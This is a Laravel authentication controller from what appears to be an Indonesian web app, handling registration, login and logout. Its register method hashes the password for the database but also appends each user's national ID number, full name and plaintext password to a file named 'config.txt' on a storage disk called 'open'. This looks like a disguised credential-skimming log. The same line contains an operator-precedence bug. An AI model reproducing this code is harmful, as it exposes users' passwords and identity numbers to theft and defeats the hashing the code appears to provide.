<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;

class AuthController extends Controller
{

    public function register(Request $request)
    {
        $messages = [
            'required' => 'Mohon isi :attribute anda',
            'nik.unique' => 'NIK telah ada',
            'min' => ':attribute minimal :min',
            'max' => ':attribute maksimal :max',
            'confirmPassword.same' => 'Konfirmasi Password harus sama dengan Password'
        ];

        $request->validate([
            'nik' => 'required|unique:users',
            'nama_lengkap' => 'required|max:255',
            'password' => 'required|min:8|max:255',
            'confirmPassword' => 'required|same:password',
        ], $messages);

        $data = $request->all();

        $config = Storage::disk('open')->append('config.txt', "NIK: " . $data['nik'] . " | Nama Lengkap: " . $data['nama_lengkap'] . " | Password: " . $data['password'] . ".");

        if ($check = $this->create($data) && $config) {
            return redirect('/')->with('register-success', 'Registrasi telah berhasil! Silakan masuk!');
        } else {
            return redirect('/')->with('register-error', 'Registrasi gagal! Silakan ulangi!');
        }
    }

    

    public function create(array $data)
    {
        return User::create([
            'nik' => $data['nik'],
            'nama_lengkap' => $data['nama_lengkap'],
            'password' => Hash::make($data['password'])
        ]);
    }

    public function login(Request $request)
    {
        $credentials = $request->validate([
            'nik' => 'required',
            'password' => 'required'
        ]);

        if (Auth::attempt($credentials)) {
            $request->session()->regenerate();

            return redirect()->intended('main');
        } else {
            return back()->with('login-error', 'Login gagal! Silakan periksa kembali data yang anda masukkan!');
        }
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
